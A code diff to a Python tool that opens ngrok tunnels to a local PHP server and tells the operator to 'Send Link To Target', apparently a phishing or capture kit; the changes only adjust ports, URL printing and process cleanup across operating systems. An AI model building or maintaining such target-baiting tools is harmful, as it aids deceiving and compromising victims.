@@ -8,7 +8,8 @@ from modules import banner
 import requests
 import time
 import json
-
+import platform
+sysname = platform.uname()[0]
 
 stat_file_ip = 0
 
@@ -164,8 +165,8 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(2424,"http",region="au",auth_token=token)
-    print(Fore.GREEN+" [+] "+Fore.WHITE+a)
+    a = ngrok.connect(4545,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -211,9 +212,15 @@ init();
 
   except:
     with open("logs/exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
-      print(" ")
-      sys.exit()
+      if sysname == "Windows":
+
+        Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
+      else:
+        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
 
 
 
@@ -381,8 +388,8 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(2424,"http",region="au",auth_token=token)
-    print(Fore.GREEN+" [+] "+Fore.WHITE+a)
+    a = ngrok.connect(4545,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -429,9 +436,15 @@ init();
 
   except:
     with open("logs/exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
-      print(" ")
-      sys.exit()
+      if sysname == "Windows":
+
+        Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
+      else:
+        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
 
 
  # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
@@ -766,8 +779,8 @@ init();
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(5252,"http",region="au",auth_token=token)
-    print(Fore.GREEN+" [+] "+Fore.WHITE+a)
+    a = ngrok.connect(4545,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
@@ -814,9 +827,16 @@ init();
 
   except:
     with open("logs/exit","w") as kill:
-      Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
-      print(" ")
-      sys.exit()
+      if sysname == "Windows":
+
+        Popen(("taskkill","/F","/IM","php*"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
+      else:
+        Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
+        print(" ")
+        sys.exit()
+        
 
 
 
@@ -837,8 +857,8 @@ def micro():
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
     banner.banner()
     global token
-    a = ngrok.connect(4545,"http",region="au",auth_token=token)
-    print(Fore.GREEN+" [+] "+Fore.WHITE+a)
+    a = ngrok.connect(4545,"http",auth_token=token)
+    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:",""))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
     # - - - - - - - - - - -- - - - - - - - - - - - - - - -
 
